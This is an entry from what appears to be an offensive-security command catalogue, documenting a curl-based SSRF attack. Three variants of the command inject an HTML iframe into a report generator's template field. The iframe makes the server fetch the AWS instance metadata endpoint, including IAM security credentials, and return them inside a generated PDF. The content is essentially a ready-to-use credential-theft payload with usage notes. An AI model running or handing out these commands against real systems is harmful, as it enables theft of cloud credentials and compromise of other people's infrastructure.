---
data: >-
  curl -X POST 'https://target.com/analytics/reports/generate' -d
  'template=<iframe
  src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>'
  --header 'Content-Type: application/x-www-form-urlencoded'
tags:
  - ssrf
  - injection
  - http
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d80d1729-0a64-4a7a-a4da-04874adf13a8
created_at: '2025-12-11T06:10:22.548Z'
updated_at: '2025-12-11T06:10:22.548Z'
verified: false
validated: true
submitted: true
---
# curl-inject-ssrf-iframe

## Command

```bash
curl -X POST 'https://target.com/analytics/reports/generate' -d 'template=<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>' --header 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command uses curl to send a POST request injecting an HTML iframe into the template parameter, triggering SSRF to access AWS metadata during PDF generation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Sends data in request body | Yes |
| `--header` | Adds Content-Type header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/analytics/reports/generate' -d 'template=<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>' --header 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/analytics/reports/generate' -d 'template=<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="100%"></iframe>' --header 'Content-Type: application/x-www-form-urlencoded' -o output.pdf
```

## Expected Output

A generated PDF file or response containing the fetched AWS metadata if successful.

## Related

- [[commands/aws-ssm-send-command]]
- [[procedures/Inject-HTML-Iframe-for-SSRF-Exploitation]]
